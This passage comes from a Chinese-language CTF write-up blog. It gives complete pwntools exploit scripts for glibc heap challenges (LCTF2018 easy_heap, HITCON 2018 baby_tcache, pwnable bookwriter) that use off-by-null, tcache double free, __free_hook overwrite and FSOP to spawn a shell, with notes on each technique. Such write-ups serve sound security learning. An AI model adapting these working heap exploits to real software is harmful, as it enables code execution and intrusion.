function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">create_heap(<span class="number">0x20</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">create_heap(<span class="number">0x80</span>, <span class="string">b&quot;dada&quot;</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="LCTF2018-PWN-easy-heap"><a href="#LCTF2018-PWN-easy-heap" class="headerlink" title="LCTF2018 PWN easy_heap"></a>LCTF2018 PWN easy_heap</h2><p><strong>难度:★★★</strong></p><p>保护全开</p><p>难度有一部分是来与堆tcache的不熟悉,以及其综合运用了unosrtedbin的许多相关利用点,主要还是太久没学,对堆的知识有些生分了</p><p> 学习的第一道带tcache bin的堆题,借此巩固自己堆tchche的学习</p><p>程序在自己实现的读入函数中存在off-by-null的漏洞</p><p>最多可以添加10个chunk</p><p>如果释放chunk那么前7个是会进入tcache的</p><p>利用的主要点自然是off-by-null,达到overlapping或extended的效果</p><p>但由于tcache以及本题固定大小chunk的影响显然不能直接利用</p><p>于是在凑满tcache后,再释放三个相临的chunk(命名为A,B,C)使之合并,这样c的prev_size段就被写为了0x200,</p><p>只要put null在其inuse位再释放就可以将之前的chunk包括进来,如果此时ab有处于使用状态的,则可以借机达到double free的效果</p><p>之后修改__free_hook为onegadget或者system之类皆可</p><p>另外因为本题无修改功能,因此只能重新分配改写字段</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./eh&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.sendline(content)</span><br><span class="line">          </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一步，构造堆大致布局,哪些chunk进入tcahce那些进入unsorted十分重要</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;abcd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line">   </span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#防止unsorted与top合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">delete(i)</span><br><span class="line">   </span><br><span class="line"><span class="comment">#其实微微调整其他类似布局也是可以的</span></span><br><span class="line"><span class="comment">#此时三个unsorted已经合并完成，并且末尾的unosrted的prev_size已被修改为0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二步，开始利用off-by-null</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)<span class="comment">#into tcache</span></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#into unsorted</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#get prev-8 which changed to 0 and put null in next&#x27;s prev_size fields</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#trigger </span></span><br><span class="line"><span class="comment">#这几个顺序很重要</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#get prev-7 and incise the big chunk made 0&#x27;s fd,bk writed</span></span><br><span class="line">libc_leak = u64(show(<span class="number">0</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">libc.address = libc_leak - <span class="number">0x3ebca0</span> <span class="comment">#get from gdb</span></span><br><span class="line"><span class="comment"># assign libc.address could admit us not to plus libc_base</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line"><span class="comment">#上面两个操作说是绕过检测，即因为之后会取出三次，则counts必然要符合条件，则至少要释放三次，因此上面的操作去掉一个也是可以的</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment"># 0 amd 9 point to the same chunk</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#double free made point to itself</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># 0 lifo find chunk by fd</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;win&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0xb-0xc</strong></p><p>顺便学了个新技巧,libc.address在赋值为libcbase后,再得到的地址就已经自动加上了libcbase,不用另外自己加</p><p>其实有tcache的思路与无大差不差,只是存在一个优先级十分高的tcache,影响思路的具体执行</p><h2 id="HITCON-2018-PWN-baby-tcache"><a href="#HITCON-2018-PWN-baby-tcache" class="headerlink" title="HITCON 2018 PWN baby_tcache"></a>HITCON 2018 PWN baby_tcache</h2><p><strong>难度:★★★★</strong></p><p>保护全开</p><p>程序十分简单只有两个功能,malloc与free,不过程序越简单不代表越好,因为没有show函数,要想泄露信息变得难上加难</p><p>程序自带一个可能的off-by-null</p><p>wiki提供了两种思路,第一种需要爆破,第二种利用了io_file的知识,选择第二种</p><p>_IO_2_1_stdout等结构体位于libc段中,main_arena也位于libc段中,那么他们就有固定的偏移,并且这个偏移量并不太大,依此可以部分写达到目的,</p><p>_IO_2_1_stdout和main_arena除了后12位皆相等,不过我们只能写16位,这也就意味着exp只有十六分之一的成功率</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;./bt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size,data=<span class="string">b&#x27;abc&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">new(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x4f8</span>)<span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>)<span class="comment">#6 avoid consolidate with top</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">b&#x27;\x60\x06&#x27;</span>)  <span class="comment">#4  put null in 5</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#into tcache，切割后fd和bk写入unsorted</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#写fd????</span></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment">#unsorted and trigger consolidate 0 1 2 3 4 </span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x530</span>) <span class="comment">#使2的fd变为unsorted  idx-&gt;0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment"># into tcache </span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">0xa8</span>, <span class="string">b&#x27;\x60\x27&#x27;</span>)<span class="comment">#2760覆写2的fd部分,碰撞低地址16位,成功概率十六分之一</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x40</span>)<span class="comment">#取出 2-&gt;idx 4</span></span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#把stdout取出来了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(p.recv(<span class="number">8</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak!!!!!!!!!&quot;</span>)</span><br><span class="line">info1 = p.recv(<span class="number">8</span>)<span class="comment">#观测得知这里是我们要的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(info1))</span><br><span class="line">libc.address = u64(info1) - <span class="number">0x3ed8b0</span></span><br><span class="line">log.info(<span class="string">&quot;libc @ &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0xa8</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#4 的fd</span></span><br><span class="line">new(<span class="number">0x60</span>)<span class="comment">#取出4-&gt;idx 6</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc.address + <span class="number">0x4f302</span>)) <span class="comment"># one gadget with $rsp+0x40 = NULL再取出freehook-fakechunk</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#trigger</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>挺难的,结合了io_file的知识</p><h2 id="pwnable-bookwriter"><a href="#pwnable-bookwriter" class="headerlink" title="pwnable_bookwriter"></a>pwnable_bookwriter</h2><p><strong>难度:★★★</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p>主要漏洞点:</p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p>利用核心:</p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li></ol><p>实现过程:</p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p><strong>exp:</strong>(有小概率失败,可能是aslr的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0xf</strong></p><h2 id="2022春秋杯-torghast"><a href="#2022春秋杯-torghast" class="headerlink" title="2022春秋杯-torghast"></a>2022春秋杯-torghast</h2><p><strong>难度:★★★</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 